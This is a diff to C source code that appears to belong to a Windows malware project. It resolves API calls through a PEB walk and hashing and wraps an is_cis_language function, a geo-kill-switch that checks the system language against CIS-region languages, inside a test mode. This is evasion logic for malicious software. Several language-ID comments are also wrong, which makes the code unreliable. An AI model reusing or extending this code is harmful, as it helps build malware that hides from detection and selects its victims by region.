@@ -5,6 +5,40 @@
  * All Win32 API calls are resolved through PEB walk + hash.
  */
 
+#ifdef TEST_EVASION_STANDALONE
+/* Standalone test mode: expose pure logic functions only */
+#include <windows.h>
+#include "detection.h"
+#include "config.h"
+#include <string.h>
+
+int is_cis_language(uint16_t lang_id) {
+    uint16_t primary = lang_id & 0x3FF;
+    switch (primary) {
+        case 0x19: /* Russian */
+        case 0x22: /* Belarusian */
+        case 0x1C: /* Ukrainian */
+        case 0x2B: /* Azerbaijani */
+        case 0x1F: /* Kazakh */
+        case 0x2C: /* Kyrgyz */
+        case 0x29: /* Tajik */
+        case 0x2E: /* Turkmen */
+        case 0x2F: /* Uzbek */
+        case 0x25: /* Tatar */
+        case 0x28: /* Georgian */
+        case 0x2A: /* Armenian */
+        case 0x42: /* Chechen */
+        case 0x43: /* Chuvash */
+        case 0x37: /* Georgian (Mkhedruli) */
+            return 1;
+        default:
+            return 0;
+    }
+}
+
+#else /* Normal build */
+
+#include <windows.h>
 #include "detection.h"
 #include "evasion.h"
 #include "engine.h"
@@ -198,3 +232,4 @@ mirage_geo_result mirage_check_geo_block(void) {
 }
 
 #endif /* ENABLE_DETECTION */
+#endif /* TEST_EVASION_STANDALONE */
